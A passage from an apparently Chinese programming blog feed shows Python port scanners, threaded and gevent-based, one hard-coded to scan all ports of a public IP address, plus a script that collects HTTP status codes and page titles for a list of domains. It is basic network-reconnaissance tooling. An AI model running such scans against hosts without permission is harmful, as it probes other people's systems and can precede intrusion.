线程锁</span><br><span class="line"></span><br><span class="line"># 扫描端口队列</span><br><span class="line">def GetQueue(host):</span><br><span class="line">    PortQueue = queue.Queue()</span><br><span class="line">    for port in range(1,65535):</span><br><span class="line">        PortQueue.put((host,port))</span><br><span class="line">    return PortQueue</span><br><span class="line"></span><br><span class="line">class ScanThread(threading.Thread):</span><br><span class="line">    def __init__(self,SingleQueue,outip):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.daemon = True</span><br><span class="line">        # self.setDaemon(True)</span><br><span class="line">        self.SingleQueue = SingleQueue</span><br><span class="line">        self.outip = outip</span><br><span class="line">    def ping(self,scanIP,port):</span><br><span class="line">        global OpenPort,Lock</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(1)</span><br><span class="line">        address = (scanIP,port)</span><br><span class="line">        try:</span><br><span class="line">            sock.connect(address)</span><br><span class="line">        except:</span><br><span class="line">            sock.close()</span><br><span class="line">            return False</span><br><span class="line">        sock.close()</span><br><span class="line">        print(scanIP, port)</span><br><span class="line">        if lock.acquire():</span><br><span class="line">            lock.release()</span><br><span class="line">        return True</span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.SingleQueue.empty():</span><br><span class="line">            # print(self.SingleQueue.get())</span><br><span class="line">            host,port = self.SingleQueue.get()</span><br><span class="line">            self.ping(host,port)</span><br><span class="line"></span><br><span class="line">class Work():</span><br><span class="line">    def __init__(self,scan_id = &apos;&apos;,scan_target=&apos;&apos;,scan_type = &apos;&apos;,scan_args=&apos;&apos;,back_fn=None):</span><br><span class="line">        self.scan_id = scan_id</span><br><span class="line">        self.target = scan_target</span><br><span class="line">        self.scan_type = scan_type</span><br><span class="line">        self.args = scan_args</span><br><span class="line">        self.back_fn = back_fn</span><br><span class="line">        self.result= []</span><br><span class="line">    def run(self):</span><br><span class="line">        ThreadList = []</span><br><span class="line">        SingLeQueue = GetQueue(self.target)</span><br><span class="line">        resultQueue = queue.Queue()</span><br><span class="line">        for i in range(0,200):</span><br><span class="line">            t = ScanThread(SingLeQueue,resultQueue)</span><br><span class="line">            ThreadList.append(t)</span><br><span class="line">        for t in ThreadList:</span><br><span class="line">            t.start()</span><br><span class="line">        for t in ThreadList:</span><br><span class="line">            t.join()</span><br><span class="line">start_time = time.time()</span><br><span class="line">t = Work(scan_target = &quot;111.7.163.233&quot;)</span><br><span class="line">t.run()</span><br><span class="line">print(&apos;%d second&apos; % (time.time() - start_time))</span><br></pre></td></tr></table></figure><p>执行完成63S</p><h2 id="使用协程的方式"><a href="#使用协程的方式" class="headerlink" title="使用协程的方式"></a>使用协程的方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gevent</span><br><span class="line">from gevent import monkey</span><br><span class="line">from gevent.pool import Pool</span><br><span class="line">monkey.patch_all()</span><br><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">class work():</span><br><span class="line">    def __init__(self,scan_target = &quot;&quot;):</span><br><span class="line">        self.pool = Pool(200)</span><br><span class="line">        self.timeout=0.1</span><br><span class="line">        self.target = scan_target</span><br><span class="line">    def port_scan(self,port):</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(self.timeout)</span><br><span class="line">        try:</span><br><span class="line">            sock.connect((self.target,port))</span><br><span class="line">            print(self.target,&quot;:&quot;,port)</span><br><span class="line">        except:</span><br><span class="line">            sock.close()</span><br><span class="line">    def run(self):</span><br><span class="line">        res = []</span><br><span class="line">        for port in range(1,65535):</span><br><span class="line">            res.append(port)</span><br><span class="line">        self.pool.map(self.port_scan,res)</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">t = work(&apos;127.0.0.1&apos;)</span><br><span class="line">t.run()</span><br><span class="line">print(&apos;%d second&apos; % (time.time() - start_time))</span><br></pre></td></tr></table></figure><p>扫描完成需155S</p><h2 id="Python-简单的爬取网站状态码"><a href="#Python-简单的爬取网站状态码" class="headerlink" title="Python 简单的爬取网站状态码"></a>Python 简单的爬取网站状态码</h2><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import threadpool</span><br><span class="line">import traceback</span><br><span class="line">code_200 = []</span><br><span class="line">code_not200 = []</span><br><span class="line">_REGEX_ = &apos;&lt;title&gt;(.*)&lt;/title&gt;&apos;</span><br><span class="line">def getTitle(url):</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        pattern = re.compile(_REGEX_, flags=re.IGNORECASE)</span><br><span class="line">        try:</span><br><span class="line">            title = re.findall(pattern, response.text)[0]</span><br><span class="line">        except IndexError:</span><br><span class="line">            title = &apos;无标题&apos;</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            code_200.append(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;)</span><br><span class="line">            print(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;)</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            code_not200.append(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;)</span><br><span class="line">            print(&#123;&apos;url&apos;: url, &apos;title&apos;: title, &quot;status_code&quot;: response.status_code&#125;)</span><br><span class="line">            return</span><br><span class="line">    except Exception as e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    domain = []</span><br><span class="line">    with open(&apos;test5.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        for i in f.readlines():</span><br><span class="line">            domain.append(i.strip())</span><br><span class="line">        f.close()</span><br><span class="line">    print(domain)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    pool = threadpool.ThreadPool(100)</span><br><span class="line">    requests_1 = threadpool.makeRequests(getTitle, domain)</span><br><span class="line">    [pool.putRequest(req) for req in requests_1]</span><br><span class="line">    pool.wait()</span><br><span class="line">    with open(&apos;test6.txt&apos;,&apos;w+&apos;,encoding=&apos;UTF-8&apos;) as f:</span><br><span class="line">        for i in code_200:</span><br><span class="line">            f.write(str(i) + &apos;\n&apos;)</span><br><span class="line">        for i in code_not200:</span><br><span class="line">            f.write(str(i) + &apos;\n&apos;)</span><br><span class="line">    print(&apos;%d second&apos; % (time.time() - start_time))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;使用队列-多线程方法&quot;&gt;&lt;a href=&quot;#使用队列-多线程方法&quot; class=&quot;headerlink&quot; title=&quot;使用队列 多线程方法&quot;&gt;&lt;/a&gt;使用队列 多线程方法&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
    
  </entry>
  
</feed>
